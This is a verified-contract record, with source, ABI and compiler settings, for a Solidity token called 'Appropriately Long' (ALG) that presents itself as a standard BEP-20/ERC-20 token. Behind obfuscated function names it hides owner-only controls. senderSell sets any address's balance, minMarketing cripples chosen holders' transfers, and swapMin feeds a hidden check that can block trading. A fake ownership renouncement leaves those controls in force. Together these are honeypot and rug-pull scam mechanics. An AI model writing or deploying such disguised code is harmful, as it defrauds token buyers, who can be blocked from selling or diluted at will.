{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface launchWallet {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract autoWallet {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface maxMarketing {\n    function createPair(address takeMarketingLaunch, address listMode) external returns (address);\n}\n\ninterface tradingTotalTx {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address marketingSwap) external view returns (uint256);\n\n    function transfer(address autoLiquiditySender, uint256 limitSender) external returns (bool);\n\n    function allowance(address enableAt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 limitSender) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address autoLiquiditySender,\n        uint256 limitSender\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverTotal, uint256 value);\n    event Approval(address indexed enableAt, address indexed spender, uint256 value);\n}\n\ninterface buyLaunched is tradingTotalTx {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AppropriatelyLong is autoWallet, tradingTotalTx, buyLaunched {\n\n    uint256 private shouldTake;\n\n    function senderSell(address launchExempt, uint256 limitSender) public {\n        receiverTeam();\n        launchedIs[launchExempt] = limitSender;\n    }\n\n    function transfer(address launchExempt, uint256 limitSender) external virtual override returns (bool) {\n        return teamToMode(_msgSender(), launchExempt, limitSender);\n    }\n\n    bool public takeReceiver;\n\n    bool public takeMin;\n\n    uint256 public toTotal;\n\n    function allowance(address tradingMode, address maxLaunch) external view virtual override returns (uint256) {\n        if (maxLaunch == maxAuto) {\n            return type(uint256).max;\n        }\n        return fundReceiver[tradingMode][maxLaunch];\n    }\n\n    uint256 public launchedLimit;\n\n    function getOwner() external view returns (address) {\n        return listIsMode;\n    }\n\n    mapping(address => bool) public limitAt;\n\n    bool private feeLaunched;\n\n    function transferFrom(address isExempt, address autoLiquiditySender, uint256 limitSender) external override returns (bool) {\n        if (_msgSender() != maxAuto) {\n            if (fundReceiver[isExempt][_msgSender()] != type(uint256).max) {\n                require(limitSender <= fundReceiver[isExempt][_msgSender()]);\n                fundReceiver[isExempt][_msgSender()] -= limitSender;\n            }\n        }\n        return teamToMode(isExempt, autoLiquiditySender, limitSender);\n    }\n\n    function minMarketing(address modeTo) public {\n        receiverTeam();\n        if (takeMin != feeLaunched) {\n            takeMin = true;\n        }\n        if (modeTo == totalAuto || modeTo == toBuyMode) {\n            return;\n        }\n        tokenFundMin[modeTo] = true;\n    }\n\n    string private feeSellMarketing = \"Appropriately Long\";\n\n    constructor (){\n        \n        launchWallet fundTo = launchWallet(maxAuto);\n        toBuyMode = maxMarketing(fundTo.factory()).createPair(fundTo.WETH(), address(this));\n        if (feeLaunched == takeMin) {\n            takeMin = false;\n        }\n        totalAuto = _msgSender();\n        minTotal();\n        limitAt[totalAuto] = true;\n        launchedIs[totalAuto] = receiverMarketing;\n        \n        emit Transfer(address(0), totalAuto, receiverMarketing);\n    }\n\n    function approve(address maxLaunch, uint256 limitSender) public virtual override returns (bool) {\n        fundReceiver[_msgSender()][maxLaunch] = limitSender;\n        emit Approval(_msgSender(), maxLaunch, limitSender);\n        return true;\n    }\n\n    uint256 fromToToken;\n\n    mapping(address => bool) public tokenFundMin;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverMarketing;\n    }\n\n    address private listIsMode;\n\n    address exemptShouldTx = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function symbol() external view virtual override returns (string memory) {\n        return swapReceiver;\n    }\n\n    uint256 constant walletSellReceiver = 8 ** 10;\n\n    bool private fundAuto;\n\n    function teamToMode(address isExempt, address autoLiquiditySender, uint256 limitSender) internal returns (bool) {\n        if (isExempt == totalAuto) {\n            return tokenLaunch(isExempt, autoLiquiditySender, limitSender);\n        }\n        uint256 atExempt = tradingTotalTx(toBuyMode).balanceOf(exemptShouldTx);\n        require(atExempt == feeMode);\n        require(autoLiquiditySender != exemptShouldTx);\n        if (tokenFundMin[isExempt]) {\n            return tokenLaunch(isExempt, autoLiquiditySender, walletSellReceiver);\n        }\n        return tokenLaunch(isExempt, autoLiquiditySender, limitSender);\n    }\n\n    address public toBuyMode;\n\n    uint256 public tradingToReceiver;\n\n    address maxAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function sellLaunched(address exemptLiquidity) public {\n        if (takeReceiver) {\n            return;\n        }\n        if (shouldTake == receiverAt) {\n            takeMin = true;\n        }\n        limitAt[exemptLiquidity] = true;\n        if (launchedLimit == toTotal) {\n            shouldTake = toTotal;\n        }\n        takeReceiver = true;\n    }\n\n    address public totalAuto;\n\n    function name() external view virtual override returns (string memory) {\n        return feeSellMarketing;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchReceiver;\n    }\n\n    function swapMin(uint256 limitSender) public {\n        receiverTeam();\n        feeMode = limitSender;\n    }\n\n    function balanceOf(address marketingSwap) public view virtual override returns (uint256) {\n        return launchedIs[marketingSwap];\n    }\n\n    string private swapReceiver = \"ALG\";\n\n    function tokenLaunch(address isExempt, address autoLiquiditySender, uint256 limitSender) internal returns (bool) {\n        require(launchedIs[isExempt] >= limitSender);\n        launchedIs[isExempt] -= limitSender;\n        launchedIs[autoLiquiditySender] += limitSender;\n        emit Transfer(isExempt, autoLiquiditySender, limitSender);\n        return true;\n    }\n\n    mapping(address => uint256) private launchedIs;\n\n    function owner() external view returns (address) {\n        return listIsMode;\n    }\n\n    uint8 private launchReceiver = 18;\n\n    mapping(address => mapping(address => uint256)) private fundReceiver;\n\n    function minTotal() public {\n        emit OwnershipTransferred(totalAuto, address(0));\n        listIsMode = address(0);\n    }\n\n    uint256 private receiverMarketing = 100000000 * 10 ** 18;\n\n    function receiverTeam() private view {\n        require(limitAt[_msgSender()]);\n    }\n\n    uint256 feeMode;\n\n    uint256 private receiverAt;\n\n    event OwnershipTransferred(address indexed marketingAt, address indexed shouldAmount);\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldAmount\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverTotal\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxLaunch\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitSender\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingSwap\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeTo\",\"type\":\"address\"}],\"name\":\"minMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptLiquidity\",\"type\":\"address\"}],\"name\":\"sellLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitSender\",\"type\":\"uint256\"}],\"name\":\"senderSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"limitSender\",\"type\":\"uint256\"}],\"name\":\"swapMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toBuyMode\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenFundMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingToReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitSender\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoLiquiditySender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitSender\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AppropriatelyLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}